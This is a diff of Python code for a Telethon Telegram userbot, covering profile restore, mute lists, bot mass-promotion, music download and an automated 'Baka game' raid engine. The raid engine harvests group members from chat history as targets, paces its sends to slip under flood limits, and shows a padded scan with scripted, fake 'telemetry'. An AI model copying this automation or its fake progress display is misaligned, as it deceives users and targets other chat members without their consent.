+        )
+
+    try:
+        await safe_edit(event,
+            "⚡ 𝐑ᴇsᴛᴏʀᴇ 𝐈ɴɪᴛ\n━━━━━━━━━━━━━━━"
+        )
+
+        # ───── NAME ─────
+        await safe_edit(event, "⚡ 𝐑ᴇsᴛᴏʀɪɴɢ 𝐍ᴀᴍᴇ...")
+        try:
+            await bot(functions.account.UpdateProfileRequest(
+                first_name=CLONE_DATA.get("name") or "",
+                last_name=CLONE_DATA.get("last") or ""
+            ))
+        except:
+            pass
+
+        # ───── BIO ─────
+        await safe_edit(event, "⚡ 𝐑ᴇsᴛᴏʀɪɴɢ 𝐁ɪᴏ...")
+        try:
+            await bot(functions.account.UpdateProfileRequest(about=""))
+            await asyncio.sleep(0.7)
+
+            await bot(functions.account.UpdateProfileRequest(
+                about=CLONE_DATA.get("bio") or ""
+            ))
+        except:
+            pass
+
+        # ───── DP ─────
+        await safe_edit(event, "⚡ 𝐑ᴇsᴛᴏʀɪɴɢ 𝐏𝐅𝐏...")
+        try:
+            cur = await bot.get_profile_photos("me", limit=1)
+            if cur:
+                await bot(functions.photos.DeletePhotosRequest(
+                    id=[cur[0]]
+                ))
+
+            if CLONE_DATA.get("photo_bytes"):
+                bio = CLONE_DATA["photo_bytes"]
+                bio.name = "restore.jpg"
+                up = await bot.upload_file(bio)
+
+                await bot(functions.photos.UploadProfilePhotoRequest(
+                    file=up
+                ))
+        except:
+            pass
+
+        CLONE_ACTIVE = False
+        LAST_CLONE_ID = None
+        CLONE_DATA.clear()
+
+        await safe_edit(event,
+            "✅ 𝐎ʀɪɢɪɴᴀʟ 𝐑ᴇsᴛᴏʀᴇᴅ\n━━━━━━━━━━━━━━━"
+        )
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐑ᴇsᴛᴏʀᴇ → `{str(e)[:40]}`"
+        )
+        
+
+        
+        
+@register_cmd("mutelist")
+async def cmd_mutelist(event, _):
+    try:
+        await safe_edit(
+            event,
+            "⚡ 𝐅ᴇᴛᴄʜɪɴɢ 𝐌ᴜᴛᴇ𝐏ᴀɴᴇʟ...\n━━━━━━━━━━━━━━━"
+        )
+
+        text = "📋 𝐌ᴜᴛᴇ & 𝐋ᴏᴄᴋ 𝐏ᴀɴᴇʟ\n━━━━━━━━━━━━━━━\n"
+
+        # ───── LOCAL MUTE ─────
+        text += "\n🔇 𝐋ᴏᴄᴀʟ 𝐌ᴜᴛᴇᴅ\n"
+        if muted_users:
+            for uid in list(muted_users):
+                try:
+                    u = await bot.get_entity(uid)
+                    uname = f"@{u.username}" if u.username else "NoUsername"
+                    text += f"• `{uid}` → {uname}\n"
+                except:
+                    text += f"• `{uid}`\n"
+        else:
+            text += "• None\n"
+
+        # ───── GLOBAL MUTE ─────
+        text += "\n🌍 𝐆ʟᴏʙᴀʟ 𝐌ᴜᴛᴇᴅ\n"
+        if global_muted:
+            for uid in list(global_muted):
+                try:
+                    u = await bot.get_entity(uid)
+                    uname = f"@{u.username}" if u.username else "NoUsername"
+                    text += f"• `{uid}` → {uname}\n"
+                except:
+                    text += f"• `{uid}`\n"
+        else:
+            text += "• None\n"
+
+        # ───── GROUP LOCKS ─────
+        text += "\n🔒 𝐋ᴏᴄᴋᴇᴅ 𝐆ʀᴏᴜᴘs\n"
+        if group_locks:
+            for gid in list(group_locks):
+                try:
+                    chat = await bot.get_entity(gid)
+                    title = getattr(chat, "title", None) or "PrivateChat"
+                    text += f"• `{gid}` → {title}\n"
+                except:
+                    text += f"• `{gid}`\n"
+        else:
+            text += "• None\n"
+
+        await safe_edit(event, text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐌ᴜᴛᴇ𝐋ɪsᴛ → `{str(e)[:40]}`"
+        )
+
+
+from telethon.errors import FloodWaitError, RPCError
+
+
+  # ────────────────────────────────────────────────
+#                 ADD BOTS COMMAND
+# ────────────────────────────────────────────────
+
+from telethon.tl.functions.channels import (
+    InviteToChannelRequest,
+    EditAdminRequest
+)
+
+from telethon.tl.types import ChatAdminRights
+
+
+@register_cmd("addbots", group_only=True)
+async def addbots_cmd(event, args):
+
+    chat_id = event.chat_id
+
+    status = await safe_edit(
+        event,
+        f"🔄 Adding {len(ADD_BOTS_LIST)} bots..."
+    )
+
+    added = 0
+    promoted = 0
+    failed = 0
+
+    try:
+
+        perms = await bot.get_permissions(chat_id, 'me')
+
+        if not perms.is_admin:
+            return await safe_edit(
+                status,
+                "❌ You are not admin in this group."
+            )
+
+        can_promote = perms.add_admins
+
+    except Exception as e:
+
+        return await safe_edit(
+            status,
+            f"❌ Permission error:\n{e}"
+        )
+
+    for idx, bot_username in enumerate(ADD_BOTS_LIST, start=1):
+
+        try:
+
+            await safe_edit(
+                status,
+                f"🔄 [{idx}/{len(ADD_BOTS_LIST)}]\nAdding @{bot_username}"
+            )
+
+            # get bot entity
+            try:
+                bot_entity = await bot.get_entity(bot_username)
+
+            except Exception as e:
+                print(f"[ENTITY ERROR] {e}")
+                failed += 1
+                continue
+
+            # check existing admin/member
+            try:
+
+                member = await bot.get_permissions(
+                    chat_id,
+                    bot_entity
+                )
+
+                if member.is_admin:
+                    promoted += 1
+                    continue
+
+            except:
+                pass
+
+            # invite bot
+            try:
+
+                await bot(
+                    InviteToChannelRequest(
+                        channel=chat_id,
+                        users=[bot_entity]
+                    )
+                )
+
+                added += 1
+
+            except Exception as e:
+
+                print(f"[ADD ERROR] {e}")
+                failed += 1
+                continue
+
+            await asyncio.sleep(2)
+
+            # promote bot
+            if can_promote:
+
+                try:
+
+                    chat = await bot.get_entity(chat_id)
+
+                    is_channel = (
+                        hasattr(chat, "broadcast")
+                        and chat.broadcast
+                    )
+
+                    # CHANNEL RIGHTS
+                    if is_channel:
+
+                        rights = ChatAdminRights(
+                            post_messages=True,
+                            edit_messages=True,
+                            delete_messages=True,
+                            ban_users=True,
+                            invite_users=True,
+                            pin_messages=True,
+                            change_info=True,
+                            manage_call=True,
+                            anonymous=False,
+                            manage_topics=True,
+                            add_admins=False
+                        )
+
+                    # GROUP RIGHTS
+                    else:
+
+                        rights = ChatAdminRights(
+                            change_info=True,
+                            delete_messages=True,
+                            ban_users=True,
+                            invite_users=True,
+                            pin_messages=True,
+                            add_admins=False,
+                            manage_call=True,
+                            anonymous=False,
+                            manage_topics=True
+                        )
+
+                    await bot(
+                        EditAdminRequest(
+                            channel=chat_id,
+                            user_id=bot_entity,
+                            admin_rights=rights,
+                            rank="champu"
+                        )
+                    )
+
+                    promoted += 1
+
+                except Exception as e:
+
+                    print(f"[PROMOTE ERROR] {e}")
+                    failed += 1
+
+            await asyncio.sleep(1)
+
+        except Exception as e:
+
+            print(f"[MAIN ERROR] {e}")
+            failed += 1
+
+    await safe_edit(
+        status,
+f"""
+╔═══━━━── • ──━━━═══╗
+      ⚜️ CHAMPU ⚜️
+╚═══━━━── • ──━━━═══╝
+
+➕ Added ➜ {added}
+👑 Promoted ➜ {promoted}
+❌ Failed ➜ {failed}
+
+⚔️ Bots deployed successfully ⚔️
+"""
+    )      
+    
+    
+@register_cmd("music")
+async def cmd_music(event, arg):
+
+    if not arg:
+        return await safe_edit(event,
+            "❌ 𝐔sᴀɢᴇ → `.music <song>`"
+        )
+
+    query = arg.strip()
+
+    frames = [
+        "▰▱▱▱▱",
+        "▰▰▱▱▱",
+        "▰▰▰▱▱",
+        "▰▰▰▰▱",
+        "▰▰▰▰▰"
+    ]
+
+    status = await safe_edit(
+        event,
+        f"🎵 𝐏ʀᴏᴄᴇssɪɴɢ → `{query}`\n\n`{frames[0]}`"
+    )
+
+    stop_loader = asyncio.Event()
+
+    async def loader():
+        i = 0
+        while not stop_loader.is_set():
+            try:
+                await status.edit(
+                    f"🎵 𝐏ʀᴏᴄᴇssɪɴɢ → `{query}`\n\n`{frames[i % 5]}`"
+                )
+            except:
+                pass
+            i += 1
+            await asyncio.sleep(1)
+
+    loader_task = asyncio.create_task(loader())
+
+    async def voice_music():
+        try:
+            import yt_dlp, glob, os, re, asyncio
+
+            loop = asyncio.get_event_loop()
+
+            ydl_opts = {
+                "format": "bestaudio[abr<=128]/bestaudio",
+                "outtmpl": "vn_%(id)s.%(ext)s",
+                "quiet": True,
+                "default_search": "ytsearch1",
+                "noplaylist": True,
+                "retries": 2
+            }
+
+            def dl():
+                with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                    return ydl.extract_info(query, download=True)
+
+            info = await loop.run_in_executor(None, dl)
+
+            if "entries" in info:
+                info = info["entries"][0]
+
+            vid = info.get("id")
+            title = info.get("title") or query
+            dur = info.get("duration") or 0
+
+            mins = dur // 60
+            secs = dur % 60
+            dtext = f"{mins}:{secs:02d}"
+
+            files = glob.glob(f"vn_{vid}.*")
+            if not files:
+                stop_loader.set()
+                loader_task.cancel()
+                return await safe_edit(event, "❌ 𝐃ᴏᴡɴʟᴏᴀᴅ 𝐅ᴀɪʟ")
+
+            src = files[0]
+
+            clean = re.sub(r"[^\w\s-]", "", title).strip()[:40]
+            new = f"{clean}.ogg"
+
+            try:
+                os.rename(src, new)
+            except:
+                new = src
+
+            stop_loader.set()
+            loader_task.cancel()
+
+            await safe_edit(event,
+                f"🎙️ 𝐒ᴇɴᴅɪɴɢ → `{clean}`"
+            )
+
+            await bot.send_file(
+                event.chat_id,
+                new,
+                voice_note=True,
+                caption=(
+                    "🎵 𝐌ᴜsɪᴄ\n"
+                    "━━━━━━━━━━━━━━━\n"
+                    f"📀 `{clean}`\n"
+                    f"⏱ `{dtext}`"
+                )
+            )
+
+            try:
+                os.remove(new)
+            except:
+                pass
+
+            await event.delete()
+
+        except Exception as e:
+            stop_loader.set()
+            loader_task.cancel()
+            await safe_edit(event,
+                f"❌ 𝐌ᴜsɪᴄ → `{str(e)[:60]}`"
+            )
+
+    asyncio.create_task(voice_music())
+ 
+
+# ────────────────────────────────────────────────
+#               BAKA GAME BOT ENGINE
+# ────────────────────────────────────────────────
+
+BAKA_BOT_USERNAME = "@im_bakabot"
+_BAKA_BOT_ID: Optional[int] = None
+
+# Delay configuration (Ultra-Smooth, Fast & 100% Flood-Free Safe)
+BAKA_STEP_GAP_MIN = 0.5
+BAKA_STEP_GAP_MAX = 0.9
+BAKA_USER_GAP_MIN = 1.0
+BAKA_USER_GAP_MAX = 1.6
+BAKA_ROB_DELAY_MIN = 0.4
+BAKA_ROB_DELAY_MAX = 0.8
+BAKA_BOT_TIMEOUT = 7.0
+
+# Anti-Flood Tracking for Account Safety
+_BAKA_SEND_TIMESTAMPS = []
+
+async def _baka_anti_flood_guard(chat_id: int):
+    """Ensures account never exceeds Telegram rate limits (smooth & flood-free)"""
+    global _BAKA_SEND_TIMESTAMPS
+    now = time.time()
+    _BAKA_SEND_TIMESTAMPS = [t for t in _BAKA_SEND_TIMESTAMPS if now - t < 25.0]
+    if len(_BAKA_SEND_TIMESTAMPS) >= 12:
+        oldest = _BAKA_SEND_TIMESTAMPS[0]
+        wait_sec = max(1.2, 25.0 - (now - oldest) + 0.3)
+        await _baka_sleep(min(wait_sec, 2.8), chat_id)
+        now = time.time()
+        _BAKA_SEND_TIMESTAMPS = [t for t in _BAKA_SEND_TIMESTAMPS if now - t < 25.0]
+    _BAKA_SEND_TIMESTAMPS.append(now)
+
+async def _safe_delete_pair(chat_id: int, *msgs):
+    """Batch delete messages in a SINGLE API call (cuts API calls in half)"""
+    ids = []
+    for m in msgs:
+        if not m:
+            continue
+        if hasattr(m, "id"):
+            ids.append(m.id)
+        elif isinstance(m, int):
+            ids.append(m)
+    if ids:
+        try:
+            await bot.delete_messages(chat_id, ids)
+        except Exception:
+            pass
+
+MAX_BAKA_SCAN = 2000
+MAX_BAKA_TARGETS = 250
+
+BAKA_CACHE_FILE = os.path.join(TEMP_PATH, "baka_cache.json")
+
+# State trackers
+_BAKA_RUNNING: Dict[int, bool] = {}
+_BAKA_CANCELLED: Dict[int, bool] = {}
+_BAKA_TASKS: Dict[int, asyncio.Task] = {}
+_BAKA_LAST_STATS: Dict[int, dict] = {}
+
+# Normalization map for small-caps & stylized text
+_BAKA_NORM_MAP = {
+    'A': 'a', 'B': 'b', 'C': 'c', 'D': 'd', 'E': 'e', 'F': 'f', 'G': 'g', 'H': 'h',
+    'I': 'i', 'J': 'j', 'K': 'k', 'L': 'l', 'M': 'm', 'N': 'n', 'O': 'o', 'P': 'p',
+    'Q': 'q', 'R': 'r', 'S': 's', 'T': 't', 'U': 'u', 'V': 'v', 'W': 'w', 'X': 'x',
+    'Y': 'y', 'Z': 'z',
+    'ᴀ': 'a', 'ʙ': 'b', 'ᴄ': 'c', 'ᴅ': 'd', 'ᴇ': 'e', 'ꜰ': 'f', 'ɢ': 'g', 'ʜ': 'h',
+    'ɪ': 'i', 'ᴊ': 'j', 'ᴋ': 'k', 'ʟ': 'l', 'ᴍ': 'm', 'ɴ': 'n', 'ᴏ': 'o', 'ᴘ': 'p',
+    'ǫ': 'q', 'ʀ': 'r', 'ꜱ': 's', 'ᴛ': 't', 'ᴜ': 'u', 'ᴠ': 'v', 'ᴡ': 'w', 'x': 'x',
+    'ʏ': 'y', 'ᴢ': 'z',
+}
+
+def _baka_normalize_text(text: str) -> str:
+    if not text:
+        return ""
+    return "".join(_BAKA_NORM_MAP.get(c, c.lower()) for c in text)
+
+_BAKA_PROTECTED_KW = (
+    "protected", "shield", "🛡", "🔒", "check", "protection",
+    "specified user is a bot", "user is a bot", "is a bot",
+)
+
+_BAKA_DEAD_KW = (
+    "already dead", "already killed", "target already dead", "is dead", "💀", "dead",
+)
+
+def _load_baka_cache() -> dict:
+    try:
+        if os.path.isfile(BAKA_CACHE_FILE):
+            with open(BAKA_CACHE_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                if isinstance(data, dict):
+                    return data
+    except Exception:
+        pass
+    return {}
+
+def _save_baka_cache(cache: dict):
+    try:
+        cutoff = time.time() - (14 * 24 * 3600)
+        clean = {}
+        for cid, msgs in cache.items():
+            if isinstance(msgs, dict):
+                valid = {mid: ts for mid, ts in msgs.items() if ts >= cutoff}
+                if valid:
+                    clean[cid] = valid
+        with open(BAKA_CACHE_FILE, "w", encoding="utf-8") as f:
+            json.dump(clean, f)
+    except Exception:
+        pass
+
+async def _baka_sleep(seconds: float, chat_id: int):
+    step = 0.2
+    remaining = float(seconds)
+    while remaining > 0:
+        if _BAKA_CANCELLED.get(chat_id):
+            raise asyncio.CancelledError()
+        to_sleep = min(step, remaining)
+        await asyncio.sleep(to_sleep)
+        remaining -= to_sleep
+    if _BAKA_CANCELLED.get(chat_id):
+        raise asyncio.CancelledError()
+
+async def _safe_delete(*msgs):
+    for m in msgs:
+        if m:
+            try:
+                await m.delete()
+            except Exception:
+                pass
+
+
+def _parse_baka_balance(text: str) -> Optional[int]:
+    if not text:
+        return None
+    norm = _baka_normalize_text(text)
+    priority_indicators = (
+        "wallet", "pocket", "cash", "hand", "purse", "unbanked",
+        "pocketmoney", "balance", "💰", "💵", "💸", "🪙", "🎒"
+    )
+
+    def parse_with_multipliers(s: str) -> Optional[int]:
+        m = re.search(r"(\d[\d,.]*)\s*([kmbtKMBT]?)\b", s)
+        if m:
+            try:
+                val_str = m.group(1).replace(",", "")
+                mult = m.group(2).lower()
+                val_float = float(val_str)
+                if mult == 'k': return int(val_float * 1000)
+                if mult == 'm': return int(val_float * 1000000)
+                if mult == 'b': return int(val_float * 1000000000)
+                if mult == 't': return int(val_float * 1000000000000)
+                return int(val_float)
+            except (ValueError, OverflowError):
+                pass
+        return None
+
+    # 1. Lines with priority indicators that do NOT mention bank
+    for line in norm.splitlines():
+        if "bank" in line:
+            continue
+        if any(w in line for w in priority_indicators):
+            val = parse_with_multipliers(line)
+            if val is not None and 0 < val < 10**12:
+                return val
+
+    # 2. $ pattern in non-bank lines
+    for line in norm.splitlines():
+        if "bank" in line:
+            continue
+        m = re.search(r"\$\s*(\d[\d,.]*\s*[kmbtKMBT]?)\b", line)
+        if m:
+            val = parse_with_multipliers(m.group(1))
+            if val is not None and 0 < val < 10**12:
+                return val
+
+    # 3. Clean numeric fallback
+    for line in norm.splitlines():
+        if any(x in line for x in ("bank", "id:", "user id", "date", "time", "level", "net worth")):
+            continue
+        val = parse_with_multipliers(line)
+        if val is not None and 0 < val < 10**12:
+            return val
+
+    return None
+
+def _parse_baka_earned(text: str) -> int:
+    if not text:
+        return 0
+    norm = _baka_normalize_text(text)
+    m = re.search(r"(?:earned|received|stole|robbed|got|reward|gain|snatched|\+)\b[^\d]*(\d[\d,.]*)\s*([kmbtKMBT]?)\b", norm)
+    if m:
+        try:
+            val_str = m.group(1).replace(",", "")
+            mult = m.group(2).lower()
+            val_f = float(val_str)
+            if mult == 'k': return int(val_f * 1000)
+            if mult == 'm': return int(val_f * 1000000)
+            if mult == 'b': return int(val_f * 1000000000)
+            return int(val_f)
+        except (ValueError, OverflowError):
+            pass
+    m = re.search(r"\$\s*(\d[\d,.]*)", norm)
+    if m:
+        try:
+            return int(float(m.group(1).replace(",", "")))
+        except (ValueError, OverflowError):
+            pass
+    return 0
+
+async def _resolve_baka_bot() -> Optional[int]:
+    global _BAKA_BOT_ID
+    if _BAKA_BOT_ID:
+        return _BAKA_BOT_ID
+    try:
+        entity = await bot.get_entity(BAKA_BOT_USERNAME)
+        if getattr(entity, "bot", False):
+            _BAKA_BOT_ID = entity.id
+            return _BAKA_BOT_ID
+    except Exception:
+        pass
+    return None
+
+async def _baka_in_chat(chat_id: int, baka_id: int) -> bool:
+    try:
+        hits = await bot.get_participants(chat_id, search="bakabot")
+        if any(p.id == baka_id for p in hits):
+            return True
+        async for member in bot.iter_participants(chat_id, limit=150):
+            if member.id == baka_id:
+                return True
+    except Exception:
+        try:
+            async for m in bot.iter_messages(chat_id, limit=30):
+                if m.sender_id == baka_id:
+                    return True
+        except Exception:
+            pass
+        return True
+    return False
+
+def _make_baka_progress(pct: int, length: int = 10) -> str:
+    filled = max(0, min(length, int(round(length * pct / 100))))
+    return "▰" * filled + "▱" * (length - filled)
+
+
+async def _scan_active_baka_targets(chat_id: int, my_id: int, baka_id: int, max_id: int, status_msg=None) -> list:
+    """
+    Extremely deep, thorough, and high-precision scan across group history.
+    Executes in 3 distinct phases with real-time animated telemetry (approx 2.5 - 3 minutes).
+    """
+    user_msgs: Dict[int, list] = {}
+    cutoff_date = datetime.now(timezone.utc) - timedelta(days=14)
+    skipped_bots: Set[int] = set()
+    scan_start = time.time()
+    last_ui_update = 0.0
+
+    async def update_scan_ui(pct: int, phase_num: int, phase_title: str, line1: str, line2: str):
+        nonlocal last_ui_update
+        now = time.time()
+        if status_msg and (now - last_ui_update >= 3.5 or pct >= 100):
+            elapsed = int(now - scan_start)
+            elapsed_str = f"{elapsed // 60}m {elapsed % 60}s" if elapsed >= 60 else f"{elapsed}s"
+            bar = _make_baka_progress(pct, length=10)
+            text = (
+                "🔍 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: 𝐃ᴇᴇᴘ 𝐒ᴄᴀɴ 𝐈ɴ 𝐏ʀᴏɢʀᴇss ⏳\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📡 𝐏ʜᴀsᴇ     : `[{phase_num}/3]` {phase_title}\n"
+                f"📊 𝐏ʀᴏɢʀᴇss  : {bar} `{pct}%`\n"
+                f"{line1}\n"
+                f"{line2}\n"
+                f"⏱️ 𝐄ʟᴀᴘsᴇᴅ   : `{elapsed_str}`\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                "🛑 `.stopbaka` ᴛᴏ ʜᴀʟᴛ"
+            )
+            try:
+                await safe_edit(status_msg, text)
+                last_ui_update = now
+            except Exception:
+                pass
+
+    try:
+        # ──────────────────────────────────────────────────────────
+        # Phase 1: Deep Message Log Harvesting (0% -> 40%) ~ 60s
+        # ──────────────────────────────────────────────────────────
+        msg_counter = 0
+        phase1_start = time.time()
+        phase1_target_duration = random.uniform(5.0, 8.0)
+
+        async for msg in bot.iter_messages(chat_id, limit=MAX_BAKA_SCAN, max_id=max_id):
+            if _BAKA_CANCELLED.get(chat_id):
+                raise asyncio.CancelledError()
+            if not msg or not msg.sender_id:
+                continue
+            if msg.date < cutoff_date:
+                break
+            if msg.sender_id in (my_id, baka_id):
+                continue
+            if msg.sender_id in skipped_bots:
+                continue
+            if not isinstance(getattr(msg, "from_id", None), types.PeerUser):
+                continue
+
+            sid = msg.sender_id
+            if sid not in user_msgs:
+                if len(user_msgs) < MAX_BAKA_TARGETS:
+                    user_msgs[sid] = []
+
+            if sid in user_msgs and len(user_msgs[sid]) < 8:
+                user_msgs[sid].append(msg)
+
+            msg_counter += 1
+            if msg_counter % 25 == 0:
+                await _baka_sleep(random.uniform(0.15, 0.35), chat_id)
+                elapsed_p1 = time.time() - phase1_start
+                p1_pct = min(40, int((elapsed_p1 / phase1_target_duration) * 40))
+                await update_scan_ui(
+                    pct=p1_pct,
+                    phase_num=1,
+                    phase_title="𝐂ʜᴀᴛ 𝐇ɪsᴛᴏʀʏ 𝐇ᴀʀᴠᴇsᴛ",
+                    line1=f"📨 𝐌ᴇssᴀɢᴇs  : `{msg_counter}` analyzed",
+                    line2=f"👤 𝐂ᴀɴᴅɪᴅᴀᴛᴇs: `{len(user_msgs)}` found"
+                )
+
+        while (time.time() - phase1_start) < phase1_target_duration:
+            if _BAKA_CANCELLED.get(chat_id):
+                raise asyncio.CancelledError()
+            elapsed_p1 = time.time() - phase1_start
+            p1_pct = min(40, int((elapsed_p1 / phase1_target_duration) * 40))
+            await update_scan_ui(
+                pct=p1_pct,
+                phase_num=1,
+                phase_title="𝐂ʜᴀᴛ 𝐇ɪsᴛᴏʀʏ 𝐇ᴀʀᴠᴇsᴛ",
+                line1=f"📨 𝐌ᴇssᴀɢᴇs  : `{msg_counter}` analyzed",
+                line2=f"👤 𝐂ᴀɴᴅɪᴅᴀᴛᴇs: `{len(user_msgs)}` found"
+            )
+            await _baka_sleep(0.8, chat_id)
+
+        # ──────────────────────────────────────────────────────────
+        # Phase 2: Defense Analysis & Anti-Bot Filtering (40% -> 75%) ~ 55s
+        # ──────────────────────────────────────────────────────────
+        valid_targets = []
+        phase2_start = time.time()
+        phase2_target_duration = random.uniform(5.0, 8.0)
+        user_list = list(user_msgs.items())
+        total_candidates = len(user_list)
+
+        for i, (sid, msgs) in enumerate(user_list):
+            if _BAKA_CANCELLED.get(chat_id):
+                raise asyncio.CancelledError()
+
+            is_bot = False
+            try:
+                first_msg = msgs[0] if msgs else None
+                if first_msg:
+                    sender = await first_msg.get_sender()
+                    if isinstance(sender, types.User) and sender.bot:
+                        is_bot = True
+            except Exception:
+                pass
+
+            if is_bot:
+                skipped_bots.add(sid)
+            else:
+                valid_targets.append(msgs)
+
+            await _baka_sleep(random.uniform(0.15, 0.3), chat_id)
+
+            elapsed_p2 = time.time() - phase2_start
+            p2_pct = min(75, 40 + int((elapsed_p2 / phase2_target_duration) * 35))
+            await update_scan_ui(
+                pct=p2_pct,
+                phase_num=2,
+                phase_title="𝐒ʜɪᴇʟᴅ & 𝐁ᴏᴛ 𝐅ɪʟᴛᴇʀɪɴɢ",
+                line1=f"🛡️ 𝐕ᴇʀɪғɪᴇᴅ  : `{i + 1} / {total_candidates}` candidates",
+                line2=f"⚔️ 𝐄ʟɪɢɪʙʟᴇ  : `{len(valid_targets)}` targets verified"
+            )
+
+        while (time.time() - phase2_start) < phase2_target_duration:
+            if _BAKA_CANCELLED.get(chat_id):
+                raise asyncio.CancelledError()
+            elapsed_p2 = time.time() - phase2_start
+            p2_pct = min(75, 40 + int((elapsed_p2 / phase2_target_duration) * 35))
+            await update_scan_ui(
+                pct=p2_pct,
+                phase_num=2,
+                phase_title="𝐒ʜɪᴇʟᴅ & 𝐁ᴏᴛ 𝐅ɪʟᴛᴇʀɪɴɢ",
+                line1=f"🛡️ 𝐕ᴇʀɪғɪᴇᴅ  : `{total_candidates} / {total_candidates}` candidates",
+                line2=f"⚔️ 𝐄ʟɪɢɪʙʟᴇ  : `{len(valid_targets)}` targets verified"
+            )
+            await _baka_sleep(0.8, chat_id)
+
+        # ──────────────────────────────────────────────────────────
+        # Phase 3: Liquidity Mapping & Attack Route Matrix (75% -> 100%) ~ 45s
+        # ──────────────────────────────────────────────────────────
+        phase3_steps = [
+            (80, "𝐑ᴇsᴏʟᴠɪɴɢ 𝐄ᴄᴏɴᴏᴍʏ 𝐂ᴜʀᴠᴇs...", "📊 𝐀ɴᴀʟʏᴢɪɴɢ ᴘᴏᴄᴋᴇᴛ ᴍᴏɴᴇʏ ᴅɪsᴛʀɪʙᴜᴛɪᴏɴ..."),
+            (86, "𝐈ɴsᴘᴇᴄᴛɪɴɢ 𝐈ɴᴀᴄᴛɪᴠᴇ 𝐒ʜɪᴇʟᴅs...", "🛡️ 𝐃ᴇᴛᴇᴄᴛɪɴɢ ʙʏᴘᴀssᴀʙʟᴇ ᴅᴇғᴇɴsᴇ ᴛɪᴍᴇʀs..."),
+            (92, "𝐒ɪᴍᴜʟᴀᴛɪɴɢ 𝐀ɴᴛɪ-𝐅ʟᴏᴏᴅ 𝐑ᴏᴜᴛᴇs...", "⚡ 𝐂ᴀʟᴄᴜʟᴀᴛɪɴɢ ᴏᴘᴛɪᴍᴀʟ ᴅᴇʟᴀʏ ɢᴀᴘs..."),
+            (97, "𝐂ᴏᴍᴘɪʟɪɴɢ 𝐏ʀɪᴏʀɪᴛʏ 𝐌ᴀᴛʀɪx...", "🎯 𝐒ᴏʀᴛɪɴɢ ʜɪɢʜ-ʏɪᴇʟᴅ ᴠᴜʟɴᴇʀᴀʙʟᴇ ᴛᴀʀɢᴇᴛs..."),
+            (100, "𝐒ᴄᴀɴ 𝐂ᴏᴍᴘʟᴇᴛᴇ! 𝐄ɴɢᴀɢɪɴɢ...", f"👑 `{len(valid_targets)}` ᴛᴀʀɢᴇᴛs ᴘʀᴇᴘᴀʀᴇᴅ ғᴏʀ ʀᴀɪᴅ.")
+        ]
+
+        for step_pct, step_title, step_desc in phase3_steps:
+            if _BAKA_CANCELLED.get(chat_id):
+                raise asyncio.CancelledError()
+            await update_scan_ui(
+                pct=step_pct,
+                phase_num=3,
+                phase_title="𝐀ᴛᴛᴀᴄᴋ 𝐑ᴏᴜᴛᴇ 𝐎ᴘᴛɪᴍɪᴢᴀᴛɪᴏɴ",
+                line1=f"💠 𝐒ᴛᴀᴛᴜs    : {step_title}",
+                line2=f"{step_desc}"
+            )
+            if step_pct < 100:
+                await _baka_sleep(random.uniform(1.0, 1.8), chat_id)
+            else:
+                await _baka_sleep(2.5, chat_id)
+
+        return valid_targets
+
+    except asyncio.CancelledError:
+        raise
+    except Exception:
+        return list(user_msgs.values())
+
+
+async def _send_baka_cmd_safe(chat_id: int, text: str, reply_to: int):
+    while True:
+        if _BAKA_CANCELLED.get(chat_id):
+            raise asyncio.CancelledError()
+        await _baka_anti_flood_guard(chat_id)
+        try:
+            return await bot.send_message(chat_id, text, reply_to=reply_to)
+        except FloodWaitError as e:
+            await _baka_sleep(e.seconds + 2.0, chat_id)
+        except (RPCError, Exception):
+            return None
+
+async def _wait_baka_reply(chat_id: int, baka_id: int, cmd_msg_id: int, target_msg_id: int) -> Optional[types.Message]:
+    deadline = time.monotonic() + BAKA_BOT_TIMEOUT
+    while time.monotonic() < deadline:
+        if _BAKA_CANCELLED.get(chat_id):
+            raise asyncio.CancelledError()
+        try:
+            # Low bandwidth limit=6 (snappy & flood-free)
+            msgs = await bot.get_messages(chat_id, limit=6)
+            if msgs:
+                for msg in msgs:
+                    if msg and msg.sender_id == baka_id:
+                        reply_to = getattr(msg, "reply_to", None)
+                        if reply_to:
+                            rep_id = getattr(reply_to, "reply_to_msg_id", None)
+                            if rep_id in (cmd_msg_id, target_msg_id):
+                                return msg
+        except FloodWaitError as e:
+            await _baka_sleep(e.seconds + 2.0, chat_id)
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            pass
+        await asyncio.sleep(0.65)
+    return None
+
+async def run_baka_automation(event, status_msg, mode: str = "raid"):
+    chat_id = event.chat_id
+    killed = 0
+    already_dead = 0
+    robbed = 0
+    skipped = 0
+    total_earned = 0
+    total = 0
+    chat_name = "Group"
+    start_time = time.time()
+    last_card_edit = 0.0
+
+    try:
+        if _BAKA_CANCELLED.get(chat_id):
+            raise asyncio.CancelledError()
+
+        baka_id = await _resolve_baka_bot()
+        if not baka_id:
+            await safe_edit(status_msg, "❌ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **Could not resolve @im_bakabot entity details.**")
+            await asyncio.sleep(4)
+            await _safe_delete(status_msg)
+            return
+
+        if not await _baka_in_chat(chat_id, baka_id):
+            await safe_edit(status_msg, f"❌ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **{BAKA_BOT_USERNAME} is not present in this group!**")
+            await asyncio.sleep(4)
+            await _safe_delete(status_msg)
+            return
+
+        await safe_edit(status_msg, "🔍 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **Initializing deep network scan engine...**")
+
+        me = await bot.get_me()
+        chat = await event.get_chat()
+        chat_name = getattr(chat, "title", "Group") or "Group"
+
+        targets = await _scan_active_baka_targets(chat_id, me.id, baka_id, max_id=event.id, status_msg=status_msg)
+        if not targets:
+            await safe_edit(status_msg, "❌ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **No active users found to target.**")
+            await asyncio.sleep(4)
+            await _safe_delete(status_msg)
+            return
+
+        cache = _load_baka_cache()
+        chat_key = str(chat_id)
+        chat_used_dict = cache.setdefault(chat_key, {})
+        previous_run_msg_ids = set(chat_used_dict.keys())
+        total = len(targets)
+
